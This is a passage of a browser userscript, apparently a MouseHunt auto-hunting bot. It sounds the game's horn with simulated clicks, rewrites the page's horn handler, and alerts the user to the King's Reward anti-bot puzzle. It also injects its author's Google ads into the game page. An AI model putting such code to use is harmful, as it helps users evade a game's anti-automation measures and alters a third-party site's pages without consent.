		setStorage("PauseLocation", pauseAtInvalidLocation.toString());
	}
	else if (pauseLocationTemp == true || pauseLocationTemp.toLowerCase() == "true")
	{
		pauseAtInvalidLocation = true;
	}
	else
	{
		pauseAtInvalidLocation = false;
	}
	pauseLocationTemp = undefined;
}

function displayTimer(title, nextHornTime, checkTime)
{
	if (showTimerInTitle)
	{
		document.title = title;
	}
	
	if (showTimerInPage)
	{
		nextHornTimeElement.innerHTML = "<b>Next Hunter Horn Time:</b> " + nextHornTime;
		checkTimeElement.innerHTML = "<b>Next Trap Check Time:</b> " + checkTime;
	}
	
	title = null;
	nextHornTime = null;
	checkTime = null;
}

function displayLocation(locStr)
{
	if (showTimerInPage && pauseAtInvalidLocation)
	{
		travelElement.innerHTML = "<b>Hunt Location:</b> " + locStr;
	}
	
	locStr = null;
}

function displayKingRewardSumTime(timeStr)
{
	if (showTimerInPage)
	{
		if (timeStr)
		{
			lastKingRewardSumTimeElement.innerHTML = "(" + timeStr + ")";
		}
		else
		{
			lastKingRewardSumTimeElement.innerHTML = "";
		}
	}
	
	timeStr = null;
}

// ################################################################################################
//   Timer Function - End
// ################################################################################################



// ################################################################################################
//   Ad Function - Start
// ################################################################################################

function addGoogleAd()
{
	// search for existing ad element and remove it
	var existingAutoBotAdElement = document.getElementById('autoBotAdDiv');
	if (existingAutoBotAdElement)
	{
		existingAutoBotAdElement.parentNode.removeChild(existingAutoBotAdElement);
		existingAutoBotAdElement = null;
	}

	// add a new ad element
	var headerElement;
	if (fbPlatform || hiFivePlatform || mhPlatform)
	{
		headerElement = document.getElementById('noscript');
	}
	else if (mhMobilePlatform)
	{
		headerElement = document.getElementById('mobileHorn');
	}
		
	if (headerElement)
	{
		var autoBotAdDivElement = document.createElement('div');
		autoBotAdDivElement.setAttribute('id', 'autoBotAdDiv');
		autoBotAdDivElement.innerHTML = '<script type="text/javascript"><!-- \
			google_ad_client = "ca-pub-0646444153861496"; \
			google_ad_slot = "5069542056"; \
			google_ad_width = 728;google_ad_height = 90; \
			//--> \
			</script> \
			<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>';
		
		headerElement.parentNode.insertBefore(autoBotAdDivElement, headerElement);
		timerDivElement = null;
	}
}

// ################################################################################################
//   Ad Function - End
// ################################################################################################



// ################################################################################################
//   Horn Function - Start
// ################################################################################################

function soundHorn()
{
	// update timer
	displayTimer("Ready to Blow The Horn...", "Ready to Blow The Horn...", "Ready to Blow The Horn...");
	
	var scriptNode = document.getElementById("scriptNode");
	if (scriptNode)
	{
		scriptNode.setAttribute("soundedHornAtt", "false");
	}		
	scriptNode = null;
	
	if (!aggressiveMode)
	{
		// safety mode, check the horn image is there or not before sound the horn
		var headerElement = document.getElementById('header');
		if (headerElement)
		{
			// need to make sure that the horn image is ready before we can click on it
			var headerStatus = headerElement.getAttribute('class');
			if (headerStatus.indexOf("hornready") != -1)
			{
				// found the horn image, let's sound the horn!
				
				// update timer
				displayTimer("Blowing The Horn...", "Blowing The Horn...", "Blowing The Horn...");
				
				// simulate mouse click on the horn
				var hornElement = document.getElementsByClassName('hornbutton')[0].firstChild;
				fireEvent(hornElement, 'click');
				hornElement = null;
				
				// clean up
				headerElement = null;
				headerStatus = null;
				
				// double check if the horn was already sounded
				window.setTimeout(function () { afterSoundingHorn() }, 5000);
			}
			else if (headerStatus.indexOf("hornsounding") != -1 || headerStatus.indexOf("hornsounded") != -1)
			{
				// some one just sound the horn...
				
				// update timer
				displayTimer("Synchronizing Data...", "Someone had just sound the horn. Synchronizing data...", "Someone had just sound the horn. Synchronizing data...");
				
				// clean up
				headerElement = null;
				headerStatus = null;
				
				// load the new data
				window.setTimeout(function () { afterSoundingHorn() }, 5000);
			}
			else if (headerStatus.indexOf("hornwaiting") != -1)
			{
				// the horn is not appearing, let check the time again
				
				// update timer
				displayTimer("Synchronizing Data...", "Hunter horn is not ready yet. Synchronizing data...", "Hunter horn is not ready yet. Synchronizing data...");
				
				// sync the time again, maybe user already click the horn
				retrieveData();
				
				checkJournalDate();
				
				// clean up
				headerElement = null;
				headerStatus = null;
				
				// loop again
				window.setTimeout(function () { countdownTimer() }, timerRefreshInterval * 1000);
			}
			else
			{
				// some one steal the horn!
				
				// update timer
				displayTimer("Synchronizing Data...", "Hunter horn is missing. Synchronizing data...", "Hunter horn is missing. Synchronizing data...");
				
				// try to click on the horn
				var hornElement = document.getElementsByClassName('hornbutton')[0].firstChild;
				fireEvent(hornElement, 'click');
				hornElement = null;
				
				// clean up
				headerElement = null;
				headerStatus = null;
				
				// double check if the horn was already sounded
				window.setTimeout(function () { afterSoundingHorn() }, 5000);
			}
		}
		else
		{
			// something wrong, can't even found the header...
			
			// clean up
			headerElement = null;
			
			// reload the page see if thing get fixed
			reloadWithMessage("Fail to find the horn header. Reloading...", false);
		}
		
	}
	else
	{
		// aggressive mode, ignore whatever horn image is there or not, just sound the horn!
		
		// simulate mouse click on the horn
		fireEvent(document.getElementsByClassName('hornbutton')[0].firstChild, 'click');
		
		// double check if the horn was already sounded
		window.setTimeout(function () { afterSoundingHorn() }, 3000);
	}
}

function afterSoundingHorn()
{
	var scriptNode = document.getElementById("scriptNode");
	if (scriptNode)
	{
		scriptNode.setAttribute("soundedHornAtt", "false");
	}		
	scriptNode = null;

	var headerElement = document.getElementById('header');
	if (headerElement)
	{
		// double check if the horn image is still visible after the script already sound it
		var headerStatus = headerElement.getAttribute('class');
		if (headerStatus.indexOf("hornready") != -1)
		{
			// seen like the horn is not functioning well
			
			// update timer
			displayTimer("Blowing The Horn Again...", "Blowing The Horn Again...", "Blowing The Horn Again...");
			
			// simulate mouse click on the horn
			var hornElement = document.getElementsByClassName('hornbutton')[0].firstChild;
			fireEvent(hornElement, 'click');
			hornElement = null;
			
			// clean up
			headerElement = null;
			headerStatus = null;
			
			// increase the horn retry counter and check if the script is caugh in loop
			++hornRetry;
			if (hornRetry > hornRetryMax)
			{
				// reload the page see if thing get fixed
				reloadWithMessage("Detected script caught in loop. Reloading...", true);
				
				// reset the horn retry counter
				hornRetry = 0;
			}
			else
			{
				// check again later
				window.setTimeout(function () { afterSoundingHorn() }, 1000);
			}
		}
		else if (headerStatus.indexOf("hornsounding") != -1)
		{
			// the horn is already sound, but the network seen to slow on fetching the data
			
			// update timer
			displayTimer("The horn sounding taken extra longer than normal...", "The horn sounding taken extra longer than normal...", "The horn sounding taken extra longer than normal...");
			
			// clean up
			headerElement = null;
			headerStatus = null;
			
			// increase the horn retry counter and check if the script is caugh in loop
			++hornRetry;
			if (hornRetry > hornRetryMax)
			{
				// reload the page see if thing get fixed
				reloadWithMessage("Detected script caught in loop. Reloading...", true);
				
				// reset the horn retry counter
				hornRetry = 0;
			}
			else
			{
				// check again later
				window.setTimeout(function () { afterSoundingHorn() }, 3000);
			}
		}
		else
		{
			// everything look ok
			
			// update timer
			displayTimer("Horn sounded. Synchronizing Data...", "Horn sounded. Synchronizing data...", "Horn sounded. Synchronizing data...");
			
			// reload data
			retrieveData();
			
			// clean up
			headerElement = null;
			headerStatus = null;
			
			// script continue as normal
			window.setTimeout(function () { countdownTimer() }, timerRefreshInterval * 1000);
			
			// reset the horn retry counter
			hornRetry = 0;
		}
	}
}

function embedScript()
{
    // create a javascript to detect if user click on the horn manually
    var scriptNode = document.createElement('script');
	scriptNode.setAttribute('id', 'scriptNode');
    scriptNode.setAttribute('type', 'text/javascript');
	scriptNode.setAttribute('soundedHornAtt', 'false');
    scriptNode.innerHTML = '														\
		function soundedHorn()														\
		{																			\
			var scriptNode = document.getElementById("scriptNode");					\
			if (scriptNode)															\
			{																		\
				scriptNode.setAttribute("soundedHornAtt", "true");					\
			}																		\
			scriptNode = null;														\
		}																			\
		';
		
	// find the head node and insert the script into it
	var headerElement;
	if (fbPlatform || hiFivePlatform || mhPlatform)
	{
		headerElement = document.getElementById('noscript');
	}
	else if (mhMobilePlatform)
	{
		headerElement = document.getElementById('mobileHorn');
	}
	headerElement.parentNode.insertBefore(scriptNode, headerElement);
	scriptNode = null;
	headerElement = null;
	
	// change the function call of horn
	var hornButtonLink = document.getElementsByClassName('hornbutton')[0].firstChild;
	var oriStr = hornButtonLink.getAttribute('onclick').toString();
	var index = oriStr.indexOf('return false;');
	var modStr = oriStr.substring(0, index) + 'soundedHorn();' + oriStr.substring(index);
	hornButtonLink.setAttribute('onclick', modStr);
	
	hornButtonLink = null;
	oriStr = null;
	index = null;
	modStr = null;
}

// ################################################################################################
//   Horn Function - End
// ################################################################################################



// ################################################################################################
//   King's Reward Function - Start
// ################################################################################################

function kingRewardAction()
{
	// update timer
	displayTimer("King's Reward!", "King's Reward", "King's Reward!");
	displayLocation("-");
		
	// play music if needed
	playKingRewardSound();
		
	// focus on the answer input
	var inputElementList = document.getElementsByTagName('input');
	if (inputElementList)
	{
		var i;
		for (i = 0; i < inputElementList.length; ++i)
		{
			// check if it is a resume button
			if (inputElementList[i].getAttribute('name') == "puzzle_answer")
			{
				inputElementList[i].focus();
				break;
			}
		}
		i = null;
	}
	inputElementList = null;
	
	// record last king's reward time
	var nowDate = new Date();
	setStorage("lastKingRewardDate", nowDate.toString());
	nowDate = null;

	if (kingPauseTimeMax <= 0)
	{
		kingPauseTimeMax = 1;
	}
	
	kingPauseTime = kingPauseTimeMax;
	kingRewardCountdownTimer();
}

function playKingRewardSound()
{
	if (isKingWarningSound)
	{
		var browser = browserDetection();
		
		if (browser == "")
		{
			// The code below are no longer needed
			/* 
			var kingSound = document.createElement("div");
			kingSound.innerHTML = "<embed name=\"kingreward\" src=\"http://images.norack.info/prodigy_-_girls.mid\" type=\"audio/midi\" autostart=\"true\" hidden=\"true\" loop=\"true\" mastersound enablejavascript=\"true\"><noembed><bgsound src=\"http://images.norack.info/prodigy_-_girls.mid\" loop=\"infinite\"></noembed></embed>";
			
			var containerElement = document.getElementById("hgAppContainer");
			containerElement.appendChild(kingSound);
			containerElement = null;
			
			kingSound = null;
			*/
		}
		else
		{
			// midi music data
			var MIDI_DATA = 'data:audio/midi,' + 
				'MThd%00%00%00%06%00%01%00%06%01%E0' + // &#12501;&#12449;&#12452;&#12523;&#12504;&#12483;&#12480;
				'MTrk%00%00%01%67' + // Track header (data length)
				'%00%FF%51%03%07%53%00%00%FF%03%05%47%69%72%6C%73%00%FF%58%04%04%02%07%53%8C%A7%78%FF%51%03%07%71%7C%78%FF%51%03%07%90%FB%78%FF%51%03%07%B1%89%78%FF%51%03%07%D3%34%78%FF%51%03%07%F6%0B%78%FF%51%03%08%1A%1D%78%FF%51%03%08%3F%7C%78%FF%51%03%08%52%AE%78%FF%51%03%08%7A%23%78%FF%51%03%08%A3%15%78%FF%51%03%08%CD%9B%78%FF%51%03%08%F9%CB%78%FF%51%03%09%27%C0%78%FF%51%03%09%57%94%78%FF%51%03%09%89%68%78%FF%51%03%09%BD%59%78%FF%51%03%09%F3%8D%78%FF%51%03%0A%2C%2A%78%FF%51%03%0A%67%5A%78%FF%51%03%0A%A5%4A%78%FF%51%03%0A%E6%2D%78%FF%51%03%0B%2A%3B%78%FF%51%03%0B%71%B0%78%FF%51%03%0B%BC%CE%78%FF%51%03%0B%E3%D4%78%FF%51%03%0C%35%00%78%FF%51%03%0C%8A%9D%78%FF%51%03%0C%E5%0E%78%FF%51%03%0D%44%BD%78%FF%51%03%0D%AA%22%78%FF%51%03%0E%15%C4%78%FF%51%03%0E%88%3C%78%FF%51%03%0F%02%36%78%FF%51%03%0F%84%75%78%FF%51%03%10%0F%D7%78%FF%51%03%10%A5%5D%78%FF%51%03%11%46%2B%78%FF%51%03%11%F3%96%78%FF%51%03%12%AF%29%78%FF%51%03%13%12%D0%78%FF%51%03%13%E7%1B%78%FF%51%03%14%CE%B4%78%FF%51%03%15%CC%5B%78%FF%51%03%16%E3%60%78%FF%51%03%18%17%C3%78%FF%51%03%19%6E%6A%78%FF%51%03%1A%ED%61%00%FF%2F%00%4D%54%72%6B%00%00%12%EC%00%FF%03%0A%6C%65%61%64%20%73%79%6E%74%68%00%B0%64%00%00%65%00%00%06%0C%00%E0%00%40%00%B1%64%00%00%65%00%00%06%0C%00%E1%00%40%00%C0%51%00%C1%51%00%B0%07%58%00%B1%07%58%00%B0%0A%40%00%B1%0A%40%00%B0%5D%00%00%B1%5D%00%00%B0%5B%00%00%B1%5B%00%00%B0%5C%00%00%B1%5C%00%00%B0%5F%00%00%B1%5F%00%81%F0%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%87%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%FF%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%87%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%87%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%E5%20%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%32%5F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%35%5F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%35%5F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%32%5F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%35%5F%78%80%35%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%33%5F%78%80%33%50%00%90%32%3F%78%80%32%50%00%90%3E%5F%00%33%5F%78%80%3E%50%00%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%33%5F%78%80%33%50%00%90%35%5F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%36%5F%78%80%36%50%00%90%35%3F%78%80%35%50%00%90%41%5F%00%36%5F%78%80%41%50%00%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%00%90%36%5F%78%80%36%50%92%60%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%87%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%85%50%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%9